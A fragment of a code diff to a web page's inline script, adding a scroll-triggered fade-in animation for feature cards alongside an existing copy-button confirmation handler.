             btn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>已复制';
 
@@ -390,6 +885,28 @@
                 btn.classList.remove('copied');
             }, 2000);
         }
+
+        // 特性卡片进入视口动画
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -20px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, observerOptions);
+
+        document.querySelectorAll('.feature-card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(20px)';
+            card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            observer.observe(card);
+        });
     </script>
 </body>
 </html>
